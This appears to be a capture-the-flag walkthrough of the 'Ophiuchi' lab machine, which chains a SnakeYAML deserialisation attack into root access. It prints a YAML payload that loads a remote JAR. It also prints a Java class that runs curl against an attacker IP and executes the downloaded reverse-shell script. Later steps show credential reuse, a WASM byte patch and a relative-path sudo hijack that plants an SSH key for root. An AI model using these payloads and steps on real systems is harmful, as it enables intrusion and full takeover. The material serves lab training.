# Ophiuchi

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (3949).png" alt=""><figcaption></figcaption></figure>

### YAML Parser

Port 8080 was running an application that handles YAML input.

<figure><img src="../../../.gitbook/assets/image (1325).png" alt=""><figcaption></figcaption></figure>

This was obviously a deserialisation exploit, where the application handles user input without sanitsation and it can lead to code execution. Googling for this led me to this repository.

{% embed url="https://github.com/mbechler/marshalsec" %}

Based on the PoC, we can first test whether the parser is able to send requests to our host using this script:

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://VPN_IP/yaml-payload.jar"]
  ]]
]
```

And it does indeed work.

<figure><img src="../../../.gitbook/assets/image (1625).png" alt=""><figcaption></figcaption></figure>

We then need to use this bit of code here to make the machine download a reverse shell and execute it.

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http://10.10.16.9/rev.sh -o /tmp/rev.sh");
            Runtime.getRuntime().exec("bash /tmp/rev.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```

After editing this code, we need to compile it to a JAR file using these:

```bash
javac AwesomeScriptEngineFactory.java 
jar -cvf AwesomeScriptingEngineFactory.jar -C src/ .
```

This would create a JAR file. Then, we can make the machine download the JAR file using the same method as above to receive callback. This would trigger the command and our listener port would receive a reverse shell as `tomcat`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1638).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Tomcat Credentials

Since we are `tomcat`, we should look into the configurations for the Tomcat interface. This can be found within `~/conf/tomcat-users.xml`.

<figure><img src="../../../.gitbook/assets/image (1924).png" alt=""><figcaption></figcaption></figure>

We can try an `su` to the `admin` user and find that it works with this password.

<figure><img src="../../../.gitbook/assets/image (2715).png" alt=""><figcaption></figcaption></figure>

### Sudo Privileges

Since we have the password, we can check for `sudo` privileges.

<figure><img src="../../../.gitbook/assets/image (2165).png" alt=""><figcaption></figcaption></figure>

Seems that we can run `go` on a certain script:

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

The `deploy.sh` does not have absolute path, so we can create our own script to get a `root` shell. However, before running that, the script seems to check `main.wasm` and only runs `deploy.sh` if it returns 1.&#x20;

Running the script does not work no matter what for now, so let's investigate `main.wasm`. WASM is short for Web Assembly, and we can download and decompile the file here:

{% embed url="https://wasdk.github.io/WasmFiddle/" %}

This would allow us to see the code that is present. Alternatively, we can use `wasm-decompile` to read it.

```
export memory memory(initial: 16, max: 0);

global g_a:int = 1048576;
export global data_end:int = 1048576;
export global heap_base:int = 1048576;

table T_a:funcref(min: 1, max: 1);

export function info():int {
  return 0
}
```

The above code seems to do nothing but return 0, so we need to change that 0 to a 1. We can count the bytes and change the byte accordingly using `dd`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1216).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can create a `deploy.sh` file that adds our public key into the `/root/.ssh/authorized_key` folder and run the `sudo` command.

This would allow us to SSH in as `root`.

<figure><img src="../../../.gitbook/assets/image (2263).png" alt=""><figcaption></figcaption></figure>
